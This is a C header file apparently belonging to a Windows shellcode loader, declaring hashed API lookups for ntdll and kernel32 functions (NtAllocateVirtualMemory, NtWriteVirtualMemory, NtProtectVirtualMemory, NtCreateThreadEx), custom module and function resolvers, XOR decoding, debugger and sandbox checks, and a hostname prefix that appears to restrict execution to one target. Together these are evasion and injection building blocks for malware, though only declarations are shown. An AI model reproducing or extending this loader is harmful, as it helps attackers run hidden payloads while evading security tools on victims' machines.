#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>
#include <stdio.h>
#include <stdint.h>


#define HOSTNAME_PREFIX "CYCORP-"
#define DEBUG_MODE 1


#define NTDLL_HASH 0x69e00346   // ROL17
#define KERNEL32_HASH 0x79e0c5e8 // ROL17

#define QUERY_INFORMATION_PROCESS_HASH 0xcfb70e4c // A:0x7091eca7 // ROR23
#define GET_COMPUTER_NAME_HASH 0xcfb6e24c // ROR23
#define VIRTUAL_ALLOC_HASH 0x96124679 // ROR23 NtAllocateVirtualMemory
#define WRITE_MEMORY_HASH 0x92136911 // ROR23
#define VIRTUAL_PROTECT_HASH 0xd62f6483 // ROR23
#define CREATE_THREAD_HASH 0xdd007761 // ROR23
#define WAIT_FOR_SINGLE_OBJECT_HASH 0xde23aac9 // ROR23



void XOR(unsigned char *data, size_t len, WORD key);

HMODULE CustomGetModuleHandle(unsigned int module_hash);
FARPROC CustomGetProcAdress(IN HMODULE hModule, unsigned int function_hash);

uint8_t is_being_debugged();
// BYTE is_being_debugged_alternative();
// int d();
int get_disk_size();
const char* get_hostname(HMODULE hNtdll);
int starts_with(const char* str, const char* prefix);
// char* c();

int divide(int a, int b);
int multiply(int a, int b);
int add(int a, int b);
int substract(int a, int b);

typedef enum { false, true } bool;

typedef struct {
    unsigned int hash;
    uint8_t rotation_value;
    bool is_rotation_right;
} FctHash;

typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

typedef BOOL(WINAPI* GetComputerNameFunc)(
    LPSTR lpBuffer,
    LPDWORD lpnSize
);

#endif // CONFIG_H
